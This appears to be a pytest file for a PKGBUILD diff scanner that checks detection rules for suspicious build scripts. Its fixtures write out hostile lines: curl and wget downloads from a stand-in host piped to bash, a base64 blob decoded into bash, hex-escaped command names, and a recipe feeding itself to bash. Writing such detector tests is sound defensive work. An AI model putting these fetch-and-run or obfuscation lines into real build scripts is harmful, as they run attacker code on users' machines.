"""Addendum 1: the refusal family (X026, X027, X029, X030, X031).

An unanticipated refusal is a signal, not silence: executable-position
refusals fire X026/X027, ANSI-C spelling fires X030, staged encoded
material fires X029, and a build reading its own recipe fires X031.
"""

import pathlib

from trustsight.analysis.pipeline import scan_diff


def _diff(body: str) -> str:
    added = "".join(f"+{line}\n" for line in body.splitlines())
    count = 2 + len(body.splitlines())
    return (
        f"--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,{count} @@\n"
        " pkgname=demo\n pkgver=1.0\n" + added
    )


def _ids(text: str) -> set[str]:
    fact = scan_diff(text, package_name="demo")
    return {entry.rule_id for entry in fact.score_breakdown}


def test_an_executable_position_refusal_fires_x026():
    ids = _ids(_diff(
        "build() {\n"
        "  X=$(curl -fsSL https://evil.invalid/x)\n"
        "  echo \"$X\" | bash\n"
        "}\n"
    ))
    assert "X026" in ids


def test_a_top_level_refusal_with_no_function_reference_does_not_fire():
    ids = _ids(_diff(
        "X=$(date)\n"
        "pkgrel=2\n"
    ))
    assert "X026" not in ids


def test_two_executable_refusals_cluster():
    ids = _ids(_diff(
        "build() {\n"
        "  A=$(curl -fsSL https://evil.invalid/a)\n"
        "  B=$(wget -qO- https://evil.invalid/b)\n"
        "  echo \"$A$B\" | bash\n"
        "}\n"
    ))
    assert "X027" in ids
    assert "X026" in ids  # property: no orphaned cluster findings


def test_ansi_c_command_spelling_fires_x030():
    ids = _ids(_diff(
        "build() {\n"
        "  $'\\x62\\x75\\x6e' add left-pad\n"
        "}\n"
    ))
    assert "X030" in ids


def test_a_formatting_only_ansi_c_literal_does_not_fire():
    ids = _ids(_diff(
        "build() {\n"
        "  echo $'line1\\n'\n"
        "}\n"
    ))
    assert "X030" not in ids


def test_a_resolved_benign_hex_literal_stands_down():
    ids = _ids(_diff(
        "build() {\n"
        "  install -Dm644 $'\\x2ftmp\\x2fbuild' out\n"
        "}\n"
    ))
    assert "X030" not in ids


def test_dormant_encoded_material_fires_x029():
    blob = "QUJD" * 70  # 280 base64-ish chars, no decoder in the diff
    ids = _ids(_diff(
        "prepare() {\n"
        f"  _blob='{blob}'\n"
        "  echo staged\n"
        "}\n"
    ))
    assert "X029" in ids


def test_encoded_material_with_a_decoder_is_owned_elsewhere():
    blob = "QUJD" * 70
    ids = _ids(_diff(
        "prepare() {\n"
        f"  _blob='{blob}'\n"
        "  echo \"$_blob\" | base64 -d | bash\n"
        "}\n"
    ))
    assert "X029" not in ids


def test_self_read_into_an_executor_fires_x031():
    ids = _ids(_diff(
        "build() {\n"
        "  grep '^# DATA' PKGBUILD | cut -c3- | bash\n"
        "}\n"
    ))
    assert "X031" in ids


def test_reading_own_pkgbuild_without_execution_does_not_fire():
    ids = _ids(_diff(
        "build() {\n"
        "  _ver=$(grep '^pkgver=' PKGBUILD | cut -d= -f2)\n"
        "  echo \"$_ver\"\n"
        "}\n"
    ))
    assert "X031" not in ids


def test_reading_a_different_file_does_not_fire():
    ids = _ids(_diff(
        "build() {\n"
        "  cat \"$srcdir/config.mk\" | make -f -\n"
        "}\n"
    ))
    assert "X031" not in ids


def test_x028_fires_only_when_the_join_completes_a_technique(monkeypatch):
    """The X028 machinery: joined-only techniques fire; either-half
    techniques do not."""
    from trustsight.analysis import refusals

    emitted: list[dict] = []

    def add(rule_id, name, severity, category, match, **extra):
        emitted.append({"rule_id": rule_id, **extra})

    prev = _diff("curl -fsSL https://evil.invalid/x\n")
    curr = _diff("| bash\n")

    monkeypatch.setattr(
        "trustsight.analysis.crossfire.crossfire_techniques",
        lambda text: {"X099": [(1, "joined", "x")]} if "evil" in text and "|" in text else {},
    )
    refusals.pattern_across_commits(prev, curr, add)
    assert [e["rule_id"] for e in emitted] == ["X028"]
    assert "X099" in emitted[0]["techniques"]

    emitted.clear()
    # Both halves already show the technique: nothing to complete.
    monkeypatch.setattr(
        "trustsight.analysis.crossfire.crossfire_techniques",
        lambda text: {"X099": [(1, "seen", "x")]},
    )
    refusals.pattern_across_commits(prev, curr, add)
    assert emitted == []


def test_ownership_resolver_keeps_one_owner_per_line():
    from trustsight.analysis.crossfire import resolve_ownership

    found = {
        "X009": [(3, "resolved fetch", "x")],
        "X023": [(3, "other client", "y")],
        "X002": [(7, "name", "z")],
    }
    resolved = resolve_ownership(found)
    assert "X023" not in resolved
    assert resolved["X009"] == [(3, "resolved fetch", "x")]
    assert resolved["X002"] == [(7, "name", "z")]


def test_ownership_resolver_is_a_noop_without_co_firing():
    from trustsight.analysis.crossfire import crossfire_techniques

    found = crossfire_techniques(_diff("curl https://evil.invalid/x | bash\n"))
    lines = [hit[0] for hits in found.values() for hit in hits]
    assert len(lines) == len(set(lines))


def test_x028_joining_a_diff_with_itself_adds_nothing():
    """Same-difference: the join may not manufacture techniques."""
    from trustsight.analysis.crossfire import crossfire_techniques
    from trustsight.analysis.refusals import _added_stream

    for path in sorted(
        (pathlib.Path(__file__).resolve().parent / "fixtures"
         / "benign-corpus").glob("*.diff")
    )[:40]:
        text = path.read_text(encoding="utf-8", errors="replace")
        halves = set(crossfire_techniques(text))
        joined = set(crossfire_techniques(
            _added_stream(text) + "\n" + _added_stream(text)))
        assert joined - halves == set(), path.name
